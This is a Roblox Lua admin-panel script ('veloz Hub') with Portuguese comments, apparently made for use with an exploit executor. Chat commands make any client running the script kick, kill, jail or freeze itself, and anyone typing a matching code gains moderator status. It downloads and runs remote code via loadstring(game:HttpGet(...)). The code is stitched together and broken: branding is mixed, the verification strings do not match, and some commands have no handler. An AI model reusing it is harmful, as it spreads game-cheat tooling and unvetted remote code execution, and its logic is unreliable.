--// Painel 🎄veloz Hub (com verifique via chat e tag "Lcc User")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local Workspace = workspace

local Donos = {
    [""] = true,
    [""] = true,
    [""] = true,
}

local Testers = {
    [""] = true,
}

local Divulgadores = {
    [""] = true,
}

local Autorizados = {}

local playerOriginalSpeed = {}
local jaulas = {}
local jailConnections = {}

-- Evento de Tag (mantido)
local TagEvent = ReplicatedStorage:FindFirstChild("ZeusHub_TagSync")
if not TagEvent then
    TagEvent = Instance.new("RemoteEvent")
    TagEvent.Name = "Lcc_TagSync"
    TagEvent.Parent = ReplicatedStorage
end

-- Criar Tag (original)
local function CriarTag(player, tagTexto, corRGB)
    if not player.Character or not player.Character:FindFirstChild("Head") then return end
    local head = player.Character.Head
    local tagAntiga = head:FindFirstChild("CustomTag")
    if tagAntiga then tagAntiga:Destroy() end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "CustomTag"
    billboard.Adornee = head
    billboard.Size = UDim2.new(0, 150, 0, 30)
    billboard.StudsOffset = Vector3.new(0, 2.7, 0)
    billboard.AlwaysOnTop = true
    billboard.MaxDistance = 120
    billboard.Parent = head

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.25
    frame.Parent = billboard

    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 6)

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -8, 1, -8)
    label.Position = UDim2.new(0, 4, 0, 4)
    label.BackgroundTransparency = 1
    label.Text = tagTexto
    label.Font = Enum.Font.GothamBold
    label.TextSize = 12
    label.TextColor3 = corRGB or Color3.fromRGB(255, 255, 255)
    label.TextStrokeTransparency = 0
    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    label.Parent = frame

    local glow = Instance.new("UIStroke")
    glow.Color = corRGB or Color3.fromRGB(0, 100, 255)
    glow.Thickness = 1.4
    glow.Parent = frame
end

local function RemoverTag(player)
    if player.Character and player.Character:FindFirstChild("Head") then
        local tag = player.Character.Head:FindFirstChild("CustomTag")
        if tag then tag:Destroy() end
    end
end

TagEvent.OnClientEvent:Connect(function(senderName, tagTexto, r, g, b)
    local plr = Players:FindFirstChild(senderName)
    if not plr then return end
    if tagTexto == "remover" then
        RemoverTag(plr)
    else
        CriarTag(plr, tagTexto, Color3.fromRGB(r, g, b))
    end
end)

local function EnviarTagGlobal(tagTexto, cor)
    TagEvent:FireServer(LocalPlayer.Name, tagTexto, cor.R*255, cor.G*255, cor.B*255)
end

local function EnviarComando(comando, alvo)
    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        or TextChatService.TextChannels:GetChildren()[1]
    if canal then
        canal:SendAsync(";"..comando.." "..(alvo or ""))
    end
end

local function AtualizarTagPorNome(nome)
    local p = Players:FindFirstChild(nome)
    if not p then return end
    if Donos[nome] then
        CriarTag(p, "🔓 Dono Zeus", Color3.fromRGB(255,215,0))
    elseif Testers[nome] then
        CriarTag(p, "🧑‍🔬 Tester Zeus", Color3.fromRGB(100,200,255))
    elseif Divulgadores[nome] then
        CriarTag(p, "🎥 Divulgador Zeus", Color3.fromRGB(255,100,180))
    elseif Autorizados[nome] then
        CriarTag(p, "🛡️ Moderador Zeus", Color3.fromRGB(0,255,128))
    end
end

-- Função que cria a tag "Lcc User" (usada pela verificação)
local function CriarTagLccUser(player)
    if not player or not player.Character or not player.Character:FindFirstChild("Head") then return end
    local head = player.Character.Head
    local old = head:FindFirstChild("LccUserTag")
    if old then old:Destroy() end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "LccUserTag"
    billboard.Adornee = head
    billboard.Size = UDim2.new(0, 120, 0, 25)
    billboard.StudsOffset = Vector3.new(0, 2.8, 0)
    billboard.AlwaysOnTop = true
    billboard.MaxDistance = 150
    billboard.Parent = head

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "Skyline User"
    label.Font = Enum.Font.GothamBold
    label.TextSize = 14
    label.TextColor3 = Color3.fromRGB(0,170,255)
    label.TextStrokeTransparency = 0
    label.TextStrokeColor3 = Color3.fromRGB(0,0,0)
    label.Parent = billboard
end

-- Processar Mensagens (inclui verifique via chat)
local function ProcessarMensagem(msgText, authorName)
    if not msgText or not authorName then return end
    local comandoLower = msgText:lower()
    local targetLower = LocalPlayer.Name:lower()
    local character = LocalPlayer.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")

    -------------------------
    -- KICK (corrigido)
    -------------------------
    if comandoLower:match("^;kick%s+") then
        local alvo = comandoLower:match("^;kick%s+(%S+)")
        if alvo and alvo == targetLower then
            LocalPlayer:Kick("você foi kickado pela equipe veloz hub pelo seus atos")
        end
    end

    -------------------------
    -- BAN
    -------------------------
    if comandoLower:match(";ban%s+"..targetLower) then
        LocalPlayer:Kick("You got banned by veloz Hub – Painel ADM")
    end

    -------------------------
    -- KILL
    -------------------------
    if comandoLower:match(";kill%s+"..targetLower) then
        if character then character:BreakJoints() end
    end

    -------------------------
    -- KILL PLUS
    -------------------------
    if comandoLower:match(";killplus%s+"..targetLower) then
        if character then
            character:BreakJoints()
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                for i=1,10 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(10,10,10)
                    part.Anchored = false
                    part.CanCollide = false
                    part.Material = Enum.Material.Neon
                    part.BrickColor = BrickColor.Random()
                    part.CFrame = root.CFrame
                    part.Parent = Workspace
                    local bv = Instance.new("BodyVelocity")
                    bv.Velocity = Vector3.new(math.random(-50,50),math.random(20,80),math.random(-50,50))
                    bv.MaxForce = Vector3.new(1e5,1e5,1e5)
                    bv.Parent = part
                    game.Debris:AddItem(part,3)
                end
            end
        end
    end

    -------------------------
    -- JAIL
    -------------------------
    if comandoLower:match(";jail%s+"..targetLower) then
        if character and character:FindFirstChild("HumanoidRootPart") then
            local root = character.HumanoidRootPart
            local jaula = Instance.new("Part")
            jaula.Size = Vector3.new(6,6,6)
            jaula.Anchored = true
            jaula.CFrame = root.CFrame + Vector3.new(0,3,0)
            jaula.Transparency = 0.3
            jaula.BrickColor = BrickColor.new("Really black")
            jaula.Parent = Workspace
            jaulas[targetLower] = jaula
        end
    end

    -------------------------
    -- UNJAIL
    -------------------------
    if comandoLower:match(";unjail%s+"..targetLower) then
        local j = jaulas[targetLower]
        if j then
            j:Destroy()
            jaulas[targetLower] = nil

            if character and character:FindFirstChild("HumanoidRootPart") then
                character.HumanoidRootPart.CFrame =
                    character.HumanoidRootPart.CFrame + Vector3.new(0,7,0)
            end
        end
    end

    -------------------------
    -- FREEZE (GUARDA VELOCIDADE)
    -------------------------
    if comandoLower:match(";freeze%s+"..targetLower) then
        if humanoid then
            playerOriginalSpeed[targetLower] = humanoid.WalkSpeed
            humanoid.WalkSpeed = 0
        end
    end

    -------------------------
    -- UNFREEZE CORRIGIDO
    -------------------------
    if comandoLower:match(";unfreeze%s+"..targetLower) then
        if humanoid then
            local original = playerOriginalSpeed[targetLower]
            if original == nil then
                original = 16
            end
            humanoid.WalkSpeed = original
            playerOriginalSpeed[targetLower] = nil
        end
    end

    -------------------------
    -- VERIFIQUE (envia o pedido de check)
    -------------------------
    -- Detecta quando alguém clica no botão e envia ;verifique (via EnviarComando)
    -- Aqui: se detectar o comando ;verifique (qualquer jogador que ativou), envia a mensagem de check no canal
    if comandoLower:match("^;verifique") or comandoLower:match("%s;verifique") then
        local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
            or TextChatService.TextChannels:GetChildren()[1]
        if canal then
            canal:SendAsync("veloz_User_Check")
        end
    end

    -- Se nós recebemos um Lcc_User_Check (alguém pediu verificação),
    -- respondemos com Lcc_User_Active e criamos nossa própria tag local
    if comandoLower == "lcc_user_check" then
        local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
            or TextChatService.TextChannels:GetChildren()[1]
        if canal then
            canal:SendAsync("veloz_User_Active")
        end

        -- marca o proprio jogador com a tag "Lcc User"
        CriarTagLccUser(LocalPlayer)
    end

    -- Quando outro jogador responde que está ativo, cria tag nele
    if comandoLower == "lcc_user_active" then
        local plr = Players:FindFirstChild(authorName)
        if plr then
            CriarTagLccUser(plr)
        end
    end

    -------------------------
    -- Autorizar automático (mantido)
    -------------------------
    if msgText:match("[Ll]cc_%d%d%d%d") then
        Autorizados[authorName] = true
        AtualizarTagPorNome(authorName)
    end
end

-- Conectar canais
local function ConectarCanal(canal)
    if canal:IsA("TextChannel") then
        canal.MessageReceived:Connect(function(msg)
            local text = msg.Text
            local src = msg.TextSource and msg.TextSource.Name
            if text and src then
                ProcessarMensagem(text, src)
            end
        end)
    end
end

for _, ch in pairs(TextChatService.TextChannels:GetChildren()) do ConectarCanal(ch) end
TextChatService.TextChannels.ChildAdded:Connect(function(ch) ConectarCanal(ch) end)

------------------------------
-- UI WindUI (mantido)
------------------------------
local ok, WindUILib = pcall(function()
    return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
end)
if not ok then return warn("WindUI não carregado") end

local Window = WindUILib:CreateWindow({
    Title = " 🎄🚄 veloz Hub Hub - Admins/Developers 🏎️🎄",
    Icon = "code",
    Author = "by: theo, matheus",
    Folder = "Lcc - Admins",
    Size = UDim2.fromOffset(580,460),
    Transparent = true,
    Resizable = false,
    SideBarWidth = 200,
    BackgroundImageTransparency = 0.42,
    HideSearchBar = true,
    ScrollBarEnabled = true,
})

local TabComandos = Window:Tab({ Title="Admin", Icon="terminal" })
local Section = TabComandos:Section({ Title="Commands", Icon="user-cog", Opened=true })

local function getPlayersList()
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do table.insert(t,p.Name) end
    return t
end

local TargetName
local Dropdown = Section:Dropdown({
    Title = "Selecionar Jogador",
    Values = getPlayersList(),
    Value = "",
    Callback = function(opt) TargetName = opt end
})

Players.PlayerAdded:Connect(function() Dropdown:SetValues(getPlayersList()) end)
Players.PlayerRemoving:Connect(function() Dropdown:SetValues(getPlayersList()) end)

local comandos = { "kick","ban","kill","killplus","fling","backrooms","freeze","unfreeze","jail","unjail","verifique" }
for _, cmd in ipairs(comandos) do
    Section:Button({
        Title = cmd:lower(),
        Desc = "Script for ;"..cmd.." - Target",
        Callback = function()
            if cmd == "verifique" then
                -- disparar o comando verifique no chat (vai ser capturado por todos os scripts)
                EnviarComando("verifique","")
            else
                if TargetName and TargetName ~= "" then
                    EnviarComando(cmd, TargetName)
                else
                    warn("Nenhum jogador selecionado!")
                end
            end
        end
    })
end

-- Tags
local TabTag = Window:Tab({ Title="Tags", Icon="15063683371" })
local SecTag = TabTag:Section({ Title="Gerenciar Tags", Icon="tag", Opened=true })

local tagSelecionada = "🔓 Donos Lcc"
local corSelecionada = Color3.fromRGB(255,215,0)

SecTag:Dropdown({
    Title="Escolher tipo de Tag",
    Values={
        "🔓 Donos veloz",
        "🧑‍🔬 Tester veloz",
        "🛡️ Moderador veloz",
        "🎥 Divulgador veloz",
        "💻 Dev veloz"
    },
    Value="🔓 Donos veloz",
    Callback=function(v)
        tagSelecionada = v
        if v=="🔓 Donos veloz" then corSelecionada=Color3.fromRGB(255,215,0)
        elseif v=="🧑‍🔬 Tester veloz" then corSelecionada=Color3.fromRGB(100,200,255)
        elseif v=="🛡️ Moderador veloz" then corSelecionada=Color3.fromRGB(0,255,128)
        elseif v=="🎥 Divulgador veloz" then corSelecionada=Color3.fromRGB(255,100,180)
        elseif v=="💻 Dev veloz" then corSelecionada=Color3.fromRGB(255,100,180)
        end
    end
})

SecTag:Button({
    Title="Adicionar Tag",
    Desc="Adiciona a tag selecionada",
    Callback=function()
        CriarTag(LocalPlayer, tagSelecionada, corSelecionada)
        EnviarTagGlobal(tagSelecionada, corSelecionada)
    end
})

SecTag:Button({
    Title="Remover Tag",
    Desc="Remove sua tag atual",
    Callback=function()
        RemoverTag(LocalPlayer)
        TagEvent:FireServer(LocalPlayer.Name,"remover",0,0,0)
    end
})

local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://8486683243"
sound.Volume = 0.5
sound.PlayOnRemove = true
sound.Parent = Workspace
sound:Destroy()
